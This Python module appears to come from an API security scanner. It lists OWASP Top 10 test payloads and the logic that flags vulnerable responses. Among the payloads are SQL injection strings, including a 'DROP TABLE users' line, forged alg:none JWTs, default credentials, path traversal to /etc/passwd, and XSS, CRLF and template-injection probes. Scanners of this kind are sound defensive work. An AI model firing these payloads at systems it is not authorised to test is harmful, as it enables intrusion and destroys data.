"""
OWASP Top 10 Security Test Payload Library
Each test category contains payloads, detection logic, and severity levels.
"""

from dataclasses import dataclass, field
from typing import Any
import re


@dataclass
class TestPayload:
    attack_type: str
    owasp_category: str
    severity: str
    payload: Any
    description: str
    inject_in: str  # query, body, header, path


# ─────────────────────────────────────────────────────────────────
# 1. SQL INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────
SQL_INJECTION_PAYLOADS = [
    TestPayload("sql_classic_union", "A03:Injection", "critical", "' OR '1'='1", "Classic OR injection", "query"),
    TestPayload("sql_classic_union", "A03:Injection", "critical", "' OR '1'='1' --", "Commented OR injection", "query"),
    TestPayload("sql_union_select", "A03:Injection", "critical", "' UNION SELECT NULL--", "UNION NULL probe", "query"),
    TestPayload("sql_union_select", "A03:Injection", "critical", "' UNION SELECT 1,2,3--", "UNION column count", "query"),
    TestPayload("sql_error_based", "A03:Injection", "critical", "' AND 1=CONVERT(int, @@version)--", "MSSQL version leak", "query"),
    TestPayload("sql_boolean_blind", "A03:Injection", "high", "' AND 1=1--", "Boolean true condition", "query"),
    TestPayload("sql_boolean_blind", "A03:Injection", "high", "' AND 1=2--", "Boolean false condition", "query"),
    TestPayload("sql_time_blind", "A03:Injection", "high", "'; WAITFOR DELAY '0:0:5'--", "MSSQL time delay", "query"),
    TestPayload("sql_time_blind", "A03:Injection", "high", "'; SELECT SLEEP(5)--", "MySQL time delay", "query"),
    TestPayload("sql_stacked", "A03:Injection", "critical", "'; DROP TABLE users--", "Stacked drop table", "query"),
    TestPayload("sql_comment_bypass", "A03:Injection", "high", "admin'--", "Auth bypass comment", "body"),
    TestPayload("sql_integer", "A03:Injection", "medium", "1 OR 1=1", "Integer injection", "query"),
    TestPayload("sql_hex_encode", "A03:Injection", "high", "0x27 OR 0x31=0x31", "Hex encoded injection", "query"),
    TestPayload("nosql_injection", "A03:Injection", "high", '{"$gt": ""}', "NoSQL operator injection", "body"),
    TestPayload("nosql_injection", "A03:Injection", "high", '{"$ne": null}', "NoSQL not-equal injection", "body"),
    TestPayload("sql_double_encode", "A03:Injection", "medium", "%27%20OR%20%271%27%3D%271", "URL double-encoded", "query"),
]

# ─────────────────────────────────────────────────────────────────
# 2. BROKEN AUTHENTICATION PAYLOADS
# ─────────────────────────────────────────────────────────────────
BROKEN_AUTH_PAYLOADS = [
    TestPayload("jwt_none_alg", "A07:BrokenAuth", "critical",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
        "JWT with alg:none", "header"),
    TestPayload("jwt_weak_secret", "A07:BrokenAuth", "critical",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.secret",
        "JWT signed with 'secret'", "header"),
    TestPayload("jwt_expired", "A07:BrokenAuth", "medium",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.fake",
        "Expired JWT token", "header"),
    TestPayload("empty_bearer", "A07:BrokenAuth", "high", "Bearer ", "Empty bearer token", "header"),
    TestPayload("null_auth", "A07:BrokenAuth", "high", "null", "Null auth token", "header"),
    TestPayload("sql_in_auth", "A07:BrokenAuth", "critical", "admin' --", "SQL in username field", "body"),
    TestPayload("default_creds_admin", "A07:BrokenAuth", "high", {"username": "admin", "password": "admin"}, "Default admin creds", "body"),
    TestPayload("default_creds_root", "A07:BrokenAuth", "high", {"username": "root", "password": "root"}, "Default root creds", "body"),
    TestPayload("default_creds_test", "A07:BrokenAuth", "medium", {"username": "test", "password": "test"}, "Default test creds", "body"),
    TestPayload("no_auth_header", "A07:BrokenAuth", "high", "", "Missing Authorization header", "header"),
]

# ─────────────────────────────────────────────────────────────────
# 3. BROKEN ACCESS CONTROL (IDOR / BOLA)
# ─────────────────────────────────────────────────────────────────
BROKEN_ACCESS_PAYLOADS = [
    TestPayload("idor_id_zero", "A01:BrokenAccess", "critical", "0", "Access resource ID 0", "path"),
    TestPayload("idor_id_neg", "A01:BrokenAccess", "high", "-1", "Negative ID traversal", "path"),
    TestPayload("idor_id_large", "A01:BrokenAccess", "medium", "99999999", "Very large ID probe", "path"),
    TestPayload("idor_uuid_nil", "A01:BrokenAccess", "high", "00000000-0000-0000-0000-000000000000", "Nil UUID probe", "path"),
    TestPayload("path_traversal", "A01:BrokenAccess", "critical", "../../etc/passwd", "Path traversal attempt", "path"),
    TestPayload("path_traversal_enc", "A01:BrokenAccess", "critical", "..%2F..%2Fetc%2Fpasswd", "Encoded path traversal", "path"),
    TestPayload("path_traversal_win", "A01:BrokenAccess", "high", "..\\..\\windows\\win.ini", "Windows path traversal", "path"),
    TestPayload("privilege_escalation", "A01:BrokenAccess", "critical", {"role": "admin"}, "Role escalation in body", "body"),
    TestPayload("mass_assignment", "A01:BrokenAccess", "high", {"is_admin": True, "role": "admin"}, "Mass assignment probe", "body"),
    TestPayload("bola_admin_path", "A01:BrokenAccess", "critical", "admin", "Admin resource probe", "path"),
]

# ─────────────────────────────────────────────────────────────────
# 4. SECURITY MISCONFIGURATION
# ─────────────────────────────────────────────────────────────────
SECURITY_MISCONFIG_PAYLOADS = [
    TestPayload("missing_security_headers", "A05:Misconfig", "medium", None, "Check missing security headers", "header"),
    TestPayload("cors_wildcard", "A05:Misconfig", "high", "http://evil.attacker.com", "CORS wildcard check", "header"),
    TestPayload("http_methods_trace", "A05:Misconfig", "medium", None, "TRACE method enabled", "header"),
    TestPayload("debug_info_leak", "A05:Misconfig", "high", "?debug=true&verbose=1&test=1", "Debug param info leak", "query"),
    TestPayload("stack_trace_leak", "A05:Misconfig", "high", "?format=<script>", "Error stack trace trigger", "query"),
    TestPayload("env_file_exposure", "A05:Misconfig", "critical", None, "/.env file accessible", "path"),
    TestPayload("git_exposure", "A05:Misconfig", "high", None, "/.git/ directory exposed", "path"),
    TestPayload("backup_file", "A05:Misconfig", "medium", None, "/backup.sql accessible", "path"),
    TestPayload("admin_panel", "A05:Misconfig", "high", None, "/admin panel open", "path"),
    TestPayload("swagger_open", "A05:Misconfig", "medium", None, "/api-docs publicly open", "path"),
    TestPayload("x_powered_by", "A05:Misconfig", "low", None, "X-Powered-By header leaks tech", "header"),
]

# ─────────────────────────────────────────────────────────────────
# 5. INPUT VALIDATION (XSS + Overflow + Format String)
# ─────────────────────────────────────────────────────────────────
INPUT_VALIDATION_PAYLOADS = [
    TestPayload("xss_script", "A03:InputValidation", "high", "<script>alert('XSS')</script>", "Basic XSS", "query"),
    TestPayload("xss_img", "A03:InputValidation", "high", "<img src=x onerror=alert(1)>", "IMG onerror XSS", "query"),
    TestPayload("xss_svg", "A03:InputValidation", "high", "<svg/onload=alert(1)>", "SVG onload XSS", "query"),
    TestPayload("xss_encoded", "A03:InputValidation", "medium", "%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded XSS", "query"),
    TestPayload("xss_json", "A03:InputValidation", "high", '{"name": "<script>alert(1)</script>"}', "JSON XSS payload", "body"),
    TestPayload("buffer_overflow", "A03:InputValidation", "medium", "A" * 10000, "Buffer overflow probe", "query"),
    TestPayload("null_byte", "A03:InputValidation", "high", "test\x00admin", "Null byte injection", "query"),
    TestPayload("format_string", "A03:InputValidation", "high", "%s%s%s%s%s%s%s%n", "Format string probe", "query"),
    TestPayload("crlf_injection", "A03:InputValidation", "high", "test\r\nSet-Cookie: injected=1", "CRLF injection", "query"),
    TestPayload("template_injection", "A03:InputValidation", "critical", "{{7*7}}", "SSTI probe (Jinja2)", "query"),
    TestPayload("template_injection_2", "A03:InputValidation", "critical", "${7*7}", "SSTI probe (Freemarker)", "query"),
    TestPayload("integer_overflow", "A03:InputValidation", "medium", "2147483648", "Integer overflow", "query"),
    TestPayload("negative_number", "A03:InputValidation", "low", "-99999", "Negative number edge case", "query"),
    TestPayload("special_chars", "A03:InputValidation", "medium", "!@#$%^&*()_+=-`~[]{}|;':\",./<>?", "Special characters", "query"),
]

ALL_PAYLOADS = (
    SQL_INJECTION_PAYLOADS
    + BROKEN_AUTH_PAYLOADS
    + BROKEN_ACCESS_PAYLOADS
    + SECURITY_MISCONFIG_PAYLOADS
    + INPUT_VALIDATION_PAYLOADS
)


# ─────────────────────────────────────────────────────────────────
# RESPONSE ANALYSIS LOGIC
# ─────────────────────────────────────────────────────────────────

SQL_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"ORA-\d+", r"pg_query",
    r"SQLite.*Exception", r"ODBC SQL", r"Microsoft.*ODBC",
    r"Unclosed quotation", r"You have an error in your SQL",
    r"Warning.*mysql", r"supplied argument is not a valid MySQL",
    r"Column count doesn't match", r"quoted string not properly terminated",
]

STACK_TRACE_PATTERNS = [
    r"Traceback \(most recent", r"at .+\.java:\d+",
    r"System\.Exception", r"NullPointerException",
    r"Error: Cannot read", r"TypeError:", r"AttributeError:",
    r"UnhandledPromiseRejection",
]

XSS_REFLECTION_PATTERNS = [
    r"<script>alert", r"onerror=alert", r"onload=alert",
    r"javascript:alert",
]

SENSITIVE_DATA_PATTERNS = [
    r"password", r"secret", r"api_key", r"private_key",
    r"access_token", r"credentials", r"connection_string",
]

SECURITY_HEADERS = [
    "x-content-type-options",
    "x-frame-options",
    "strict-transport-security",
    "content-security-policy",
    "x-xss-protection",
    "referrer-policy",
    "permissions-policy",
]


def analyze_response(
    payload: TestPayload,
    status_code: int,
    response_body: str,
    response_headers: dict,
) -> tuple[str, str, str]:
    """
    Returns (result_status, vulnerability_detail, recommendation)
    result_status: PASS | FAIL | ERROR
    """
    body_lower = response_body.lower() if response_body else ""
    headers_lower = {k.lower(): v for k, v in (response_headers or {}).items()}

    # ── SQL Injection ──────────────────────────────────────────
    if payload.owasp_category == "A03:Injection" and "sql" in payload.attack_type:
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response_body or "", re.IGNORECASE):
                return (
                    "FAIL",
                    f"SQL error pattern '{pattern}' found in response. Database errors exposed.",
                    "Use parameterized queries / prepared statements. Never expose raw DB errors.",
                )
        if status_code == 200 and payload.attack_type == "sql_boolean_blind":
            return ("FAIL", "Server returned 200 on boolean injection — possible blind SQLi.", "Implement strict input validation.")
        if status_code in (500, 503):
            return ("FAIL", f"Server error {status_code} triggered by SQL payload — possible injection point.", "Sanitize inputs and use ORM parameterization.")
        return ("PASS", "No SQL error patterns detected.", "")

    # ── NoSQL Injection ────────────────────────────────────────
    if payload.attack_type == "nosql_injection":
        if status_code == 200 and len(response_body or "") > 100:
            return ("FAIL", "NoSQL operator injection returned data — possible authorization bypass.", "Sanitize MongoDB operators from user input.")
        return ("PASS", "NoSQL injection payload rejected.", "")

    # ── Broken Authentication ──────────────────────────────────
    if payload.owasp_category == "A07:BrokenAuth":
        if payload.attack_type == "jwt_none_alg" and status_code == 200:
            return ("FAIL", "Server accepted JWT with alg:none — signature verification disabled!", "Reject tokens with alg:none. Enforce HS256/RS256.")
        if payload.attack_type == "no_auth_header" and status_code == 200:
            return ("FAIL", "Endpoint accessible without authentication.", "Require valid authentication on protected endpoints.")
        if payload.attack_type in ("default_creds_admin", "default_creds_root") and status_code == 200:
            return ("FAIL", "Default credentials accepted.", "Change all default credentials immediately.")
        if status_code in (401, 403):
            return ("PASS", "Authentication correctly rejected.", "")
        return ("PASS", "Authentication check passed.", "")

    # ── Broken Access Control ──────────────────────────────────
    if payload.owasp_category == "A01:BrokenAccess":
        if payload.attack_type in ("path_traversal", "path_traversal_enc", "path_traversal_win"):
            traversal_indicators = ["root:", "daemon:", "[boot loader]", "for 16-bit", "password"]
            for indicator in traversal_indicators:
                if indicator in (response_body or ""):
                    return ("FAIL", f"Path traversal succeeded — file content in response: '{indicator}'", "Validate and sanitize all file paths. Use chroot jails.")
            if status_code == 200:
                return ("FAIL", "Path traversal returned 200 — investigate response content.", "Implement strict path validation.")
        if payload.attack_type == "privilege_escalation" and status_code == 200:
            if "admin" in body_lower or "role" in body_lower:
                return ("FAIL", "Role escalation may have succeeded.", "Validate role changes server-side only.")
        if status_code in (401, 403, 404):
            return ("PASS", "Access correctly denied.", "")
        return ("PASS", "Access control check passed.", "")

    # ── Security Misconfiguration ──────────────────────────────
    if payload.owasp_category == "A05:Misconfig":
        if payload.attack_type == "missing_security_headers":
            missing = [h for h in SECURITY_HEADERS if h not in headers_lower]
            if missing:
                return ("FAIL", f"Missing security headers: {', '.join(missing)}", "Add all recommended security headers to responses.")
            return ("PASS", "All key security headers present.", "")
        if payload.attack_type == "cors_wildcard":
            acao = headers_lower.get("access-control-allow-origin", "")
            if acao == "*":
                return ("FAIL", "CORS wildcard (*) allows any origin.", "Restrict CORS to trusted origins only.")
            return ("PASS", "CORS origin not wildcard.", "")
        if payload.attack_type == "x_powered_by" and "x-powered-by" in headers_lower:
            return ("FAIL", f"X-Powered-By exposes: {headers_lower['x-powered-by']}", "Remove X-Powered-By header.")
        for pattern in STACK_TRACE_PATTERNS:
            if re.search(pattern, response_body or "", re.IGNORECASE):
                return ("FAIL", "Stack trace or internal error exposed in response.", "Disable debug mode in production. Use generic error pages.")
        if payload.attack_type in ("env_file_exposure", "git_exposure") and status_code == 200:
            return ("FAIL", f"Sensitive file/directory accessible ({payload.description}).", "Block access to .env, .git and backup files via server config.")
        if status_code in (403, 404):
            return ("PASS", "Sensitive resource correctly blocked.", "")
        return ("PASS", "Misconfiguration check passed.", "")

    # ── Input Validation ──────────────────────────────────────
    if payload.owasp_category == "A03:InputValidation":
        if "xss" in payload.attack_type:
            for pattern in XSS_REFLECTION_PATTERNS:
                if re.search(pattern, response_body or "", re.IGNORECASE):
                    return ("FAIL", "XSS payload reflected in response — client-side injection possible.", "Encode all output. Use CSP headers.")
        if payload.attack_type == "template_injection" and "49" in (response_body or ""):
            return ("FAIL", "Template injection: expression {{7*7}}=49 evaluated!", "Disable template rendering for user input.")
        if payload.attack_type == "template_injection_2" and "49" in (response_body or ""):
            return ("FAIL", "Template injection: ${7*7}=49 evaluated!", "Escape template expressions from user input.")
        if payload.attack_type == "crlf_injection" and "Set-Cookie: injected" in (response_body or ""):
            return ("FAIL", "CRLF injection succeeded — HTTP header manipulation possible.", "Strip CR/LF characters from user input before using in headers.")
        if status_code == 500:
            return ("FAIL", f"Server error on input validation test — possible crash/vulnerability.", "Implement robust input validation and error handling.")
        return ("PASS", "Input validation check passed.", "")

    return ("PASS", "Test completed.", "")